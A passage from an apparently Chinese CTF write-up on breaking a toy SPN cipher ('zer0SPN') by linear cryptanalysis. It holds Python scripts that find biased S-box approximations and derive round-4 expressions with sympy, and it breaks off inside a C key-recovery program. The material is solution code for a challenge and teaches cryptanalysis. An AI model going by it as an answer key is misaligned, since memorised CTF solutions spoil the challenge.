class="line">    f = open(<span class="string">'data'</span>, <span class="string">'wb'</span>)</div><div class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">65536</span>):</div><div class="line">        c = zer0SPN(secret)</div><div class="line">        plaintext = bytearray(urandom(<span class="number">8</span>))</div><div class="line">        f.write(pack(<span class="string">'8B'</span>, *plaintext))</div><div class="line">        ciphertext = c.encrypt(plaintext)</div><div class="line">        f.write(pack(<span class="string">'8B'</span>, *ciphertext))</div><div class="line">    f.close()</div></pre></td></tr></table></figure>
<p>使用下面脚本获取S盒的缺陷表达式：(find_linear_approxmation)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> insum <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">    <span class="keyword">for</span> outsum <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">        <span class="keyword">if</span> insum&amp;(insum<span class="number">-1</span>) <span class="keyword">and</span> outsum&amp;(outsum<span class="number">-1</span>):</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        bias = sum((bin(x&amp;insum).count(<span class="string">'1'</span>) + bin(sbox[x]&amp;outsum).count(<span class="string">'1'</span>)) % <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">256</span>)) - <span class="number">128</span></div><div class="line">        <span class="keyword">if</span> abs(bias) &gt; <span class="number">40</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'+'</span>.join([<span class="string">'X'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>) <span class="keyword">if</span> insum&amp;(<span class="number">2</span>**i)] + [<span class="string">'Y'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>) <span class="keyword">if</span> outsum&amp;(<span class="number">2</span>**i)])</div></pre></td></tr></table></figure>
<p>得到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">X0+Y0+Y1+Y2+Y7</div><div class="line">X1+Y0+Y1+Y3+Y4+Y7</div><div class="line">X2+Y0+Y1+Y2+Y3+Y4+Y6+Y7</div><div class="line">X3+Y1+Y4+Y5+Y7</div><div class="line">X4+Y0+Y2+Y4+Y5+Y6</div><div class="line">X0+X3+X4+Y6</div><div class="line">X0+X1+X2+X3+X4+Y2</div><div class="line">X5+Y0+Y1+Y2+Y3+Y4</div><div class="line">X0+X2+X3+X4+X5+Y7</div><div class="line">X6+Y1+Y7</div><div class="line">X1+X2+X3+X4+X6+Y0</div><div class="line">X0+X2+X3+X4+X5+X6+Y1</div><div class="line">X7+Y0+Y4</div><div class="line">X1+X2+X4+X7+Y5</div><div class="line">X1+X6+X7+Y3</div><div class="line">X1+X2+X3+X4+X6+X7+Y4</div></pre></td></tr></table></figure>
<p>然后我们来获得到第四轮时的表达式（未亦或）：(这里选择性地用了几组开始数据)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sympy</div><div class="line">rcon = [<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>]</div><div class="line">sbox = [<span class="number">62</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">20</span>, <span class="number">210</span>, <span class="number">41</span>, <span class="number">66</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">152</span>, <span class="number">143</span>, <span class="number">75</span>, <span class="number">105</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">175</span>, <span class="number">191</span>, <span class="number">166</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">190</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">225</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">252</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">86</span>, <span class="number">235</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">197</span>, <span class="number">154</span>, <span class="number">176</span>, <span class="number">199</span>, <span class="number">253</span>, <span class="number">69</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">184</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">104</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">160</span>, <span class="number">169</span>, <span class="number">82</span>, <span class="number">148</span>, <span class="number">73</span>, <span class="number">30</span>, <span class="number">229</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">137</span>, <span class="number">157</span>, <span class="number">180</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">165</span>, <span class="number">9</span>, <span class="number">162</span>, <span class="number">233</span>, <span class="number">18</span>, <span class="number">85</span>, <span class="number">217</span>, <span class="number">84</span>, <span class="number">7</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">171</span>, <span class="number">56</span>, <span class="number">118</span>, <span class="number">237</span>, <span class="number">132</span>, <span class="number">136</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">205</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">14</span>, <span class="number">122</span>, <span class="number">47</span>, <span class="number">71</span>, <span class="number">201</span>, <span class="number">99</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">74</span>, <span class="number">173</span>, <span class="number">76</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">155</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">96</span>, <span class="number">44</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">215</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">159</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">198</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">170</span>, <span class="number">131</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">29</span>, <span class="number">230</span>, <span class="number">32</span>, <span class="number">187</span>, <span class="number">125</span>, <span class="number">134</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">164</span>, <span class="number">247</span>, <span class="number">25</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">67</span>, <span class="number">147</span>, <span class="number">146</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">243</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">239</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">70</span>, <span class="number">203</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">113</span>, <span class="number">8</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">240</span>, <span class="number">21</span>, <span class="number">93</span>, <span class="number">142</span>, <span class="number">238</span>, <span class="number">167</span>, <span class="number">5</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">145</span>, <span class="number">188</span>, <span class="number">172</span>, <span class="number">224</span>, <span class="number">226</span>, <span class="number">207</span>, <span class="number">27</span>, <span class="number">218</span>, <span class="number">48</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">4</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">196</span>, <span class="number">141</span>, <span class="number">208</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">213</span>, <span class="number">216</span>, <span class="number">232</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">212</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">129</span>, <span class="number">227</span>, <span class="number">249</span>, <span class="number">127</span>, <span class="number">149</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">31</span>, <span class="number">153</span>, <span class="number">250</span>, <span class="number">156</span>, <span class="number">168</span>, <span class="number">110</span>]</div><div class="line">ptable = [</div><div class="line">    <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">56</span>,</div><div class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">57</span>,</div><div class="line">    <span class="number">2</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">58</span>,</div><div class="line">    <span class="number">3</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">59</span>,</div><div class="line">    <span class="number">4</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">44</span>, <span class="number">52</span>, <span class="number">60</span>,</div><div class="line">    <span class="number">5</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">61</span>,</div><div class="line">    <span class="number">6</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">62</span>,</div><div class="line">    <span class="number">7</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">63</span></div><div class="line">]</div><div class="line">sbox_inv = [<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">s2b</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(int, format(int(str(s).encode(<span class="string">'hex'</span>), <span class="number">16</span>), <span class="string">'0&#123;&#125;b'</span>.format(<span class="number">8</span>*len(s))))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2s</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray.fromhex(format(reduce(<span class="keyword">lambda</span> x,y: <span class="number">2</span>*x+y, b), <span class="string">'0&#123;&#125;x'</span>.format(len(b)/<span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addkey</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">return</span> bytearray(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a, b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">assert</span> len(a) == <span class="number">8</span></div><div class="line">    bits = s2b(a)</div><div class="line">    bits = [bits[ptable[i]] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">64</span>)]</div><div class="line">    <span class="keyword">return</span> b2s(bits)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute_inv</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox_inv[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="comment"># Some precomputations of the P-box to use (byte,bit) indexing</span></div><div class="line">pt = [[<span class="keyword">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">        c = bytearray(<span class="string">'\0'</span>*<span class="number">8</span>)</div><div class="line">        c[i] = chr(<span class="number">2</span>**j)</div><div class="line">        d = permutation(c)</div><div class="line">        i2 = <span class="keyword">None</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> d[k] != <span class="number">0</span>:</div><div class="line">                <span class="keyword">assert</span> i2 <span class="keyword">is</span> <span class="keyword">None</span></div><div class="line">                i2 = k</div><div class="line">        j2 = <span class="keyword">None</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> (d[i2]&amp;(<span class="number">2</span>**k)) != <span class="number">0</span>:</div><div class="line">                <span class="keyword">assert</span> j2 <span class="keyword">is</span> <span class="keyword">None</span></div><div class="line">                j2 = k</div><div class="line">        pt[i][j] = (i2,j2)</div><div class="line"></div><div class="line">K = sympy.IndexedBase(<span class="string">'K'</span>)</div><div class="line">P = sympy.IndexedBase(<span class="string">'P'</span>)</div><div class="line">U4 = sympy.IndexedBase(<span class="string">'U4'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">k</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="comment"># not interested in which key bits are involved</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(i, b)</span>:</span></div><div class="line">    <span class="comment"># plain-text bits</span></div><div class="line">    <span class="keyword">return</span> P[i, b]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</div><div class="line">        <span class="comment"># this is the input of the last S-box, leave it as it is</span></div><div class="line">        <span class="keyword">return</span> U4[j, b]</div><div class="line">    <span class="comment"># These numbers are from the S-box biases where there is only a single input bit involved, map them to output bits</span></div><div class="line">    <span class="keyword">return</span> sum(map(<span class="keyword">lambda</span> x: v(i, j, x), [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>], [<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], [<span class="number">1</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">4</span>]][b]))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">v</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="comment"># From the output of an S-box we can get to the input of the next S-box by using the permutations (and some key bits)</span></div><div class="line">    <span class="keyword">return</span> k(i+<span class="number">1</span>, pt[j][b][<span class="number">0</span>], pt[j][b][<span class="number">1</span>])+u(i+<span class="number">1</span>, pt[j][b][<span class="number">0</span>], pt[j][b][<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">x</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="comment"># Input of the first S-box is the plaintext bit ^ a key bit</span></div><div class="line">    <span class="keyword">return</span> p(<span class="number">0</span>, i)+k(<span class="number">1</span>, <span class="number">0</span>, i)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">y</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="comment"># Output of the first S-box</span></div><div class="line">    <span class="keyword">return</span> v(<span class="number">1</span>, <span class="number">0</span>, i)</div><div class="line"></div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">6</span>)+y(<span class="number">0</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">5</span>)+x(<span class="number">6</span>)+y(<span class="number">1</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+y(<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">6</span>)+x(<span class="number">7</span>)+y(<span class="number">3</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">6</span>)+x(<span class="number">7</span>)+y(<span class="number">4</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">4</span>)+x(<span class="number">7</span>)+y(<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+y(<span class="number">6</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">5</span>)+y(<span class="number">7</span>)</div></pre></td></tr></table></figure>
<p>获得表达式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[1, 0] + U4[1, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 1] + P[0, 6] + P[0, 7] + U4[0, 0] + U4[0, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[6, 0] + U4[6, 4]</div><div class="line">P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + P[0, 7] + U4[1, 0] + U4[1, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[5, 0] + U4[5, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 1] + P[0, 2] + P[0, 4] + P[0, 7] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[6, 0] + U4[6, 4]</div><div class="line">P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + U4[3, 0] + U4[3, 4] + U4[7, 0] + U4[7, 4]</div></pre></td></tr></table></figure>
<p>最后我们看看上面的表达式，我们能够爆破的只有两个字节，因此应该选择合适的表达式进行展开。</p>
<p>由于性能的要求，这里使用的是c语言（这里用的是倒数第2个表达式）：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> sbox_inv[<span class="number">256</span>] = &#123;<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span 